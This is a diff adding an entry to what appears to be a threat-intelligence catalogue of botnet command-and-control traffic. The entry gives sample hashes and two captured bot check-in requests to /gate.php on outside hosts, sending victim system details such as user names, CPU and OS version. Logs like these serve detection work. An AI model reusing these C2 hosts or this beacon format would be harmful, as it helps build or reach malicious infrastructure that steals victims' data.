@@ -1393,3 +1393,47 @@ Cache-Control: no-cache
 
 ### Unknowns
 #################################################################################################
+#### Unknownbotnet4
+hashes:
+~~~
+e3fd7b57bb830fb083759e2d53dce0b6964985dc65d60b040c956b47f64409df
+9201efca328fa5b800a314506d8dddb47ab15e6f47af51331bd0f0e8dff3b70b
+ba59f46f684b3602258ce5433c7abbdc016ed4ee1aa2bc8d94520584da63bbc4
+3a3da758f7a96401fc3b5ad6392c9286f27fb165054b0dab30257bf28dca6be2
+839d301c9ffaf561affa77a913f6bc76498f9df31028a34b967f170fe3e600a5
+30d83178f17b86306edd85432b8092ec7b5359aa65245326399f13be43e09553
+a64f6c8a28083f8c3701b8377253ba288543a1f0eeb110725e8241fad32db168
+8647bcef74d55423bcf1877097a0c732869e29548f74933b1f0a15fce44120ac
+32cb69f85ac78e8183be54e8fbc9576a0aa36491e3782f01f59fe57bf4d9fe7a
+~~~
+~~~
+POST /gate.php HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+User-Agent: 94af05617f4e0479d766f422f611ad5c
+Content-Length: 465
+Host: smartwaay.xyz:9998
+
+rk=1&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&ys=C%3A%5CProgram+Files%5CMozilla+Firefox%5Cfirefox%2Eexe&it=1&dw=%5B%22Steven%22%5D&rt=1%2E1%2E0&yj=1&sk=8272244&vt=Intel%28R%29+Core%28TM%29+i7%2D3740QM+CPU+%40+2%2E70GHz&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&he=0&zo=39874b0c4717a111115c96bcb65bcbdd&fj=&bf=STEVEN%2DACCOUNTI
+
+POST /gate.php HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+User-Agent: 94af05617f4e0479d766f422f611ad5c
+Content-Length: 462
+Host: nicholaspring.xyz:9998
+
+vt=Intel%28R%29+Xeon%28R%29+CPU+E5%2D2630+v4+%40+2%2E20GHz&rk=1&dw=%5B%22HAPUBWS%22%5D&he=0&fj=&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&zo=ddcf33e1f0649076576a7aaee8f83b66&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&it=0&rt=1%2E1%2E0&yj=1&bf=2TWgVlMc0b&sk=3144704&ys=C%3A%5CProgram+Files%5CInternet+Explorer%5Ciexplore%2EexeHTTP/1.1 200 OK
+Date: Thu, 04 Apr 2019 14:57:08 GMT
+Server: Apache/2.4.34 (Unix)
+X-Powered-By: PHP/7.3.0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+2
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownbotnet4.png "Unknownbotnet4")
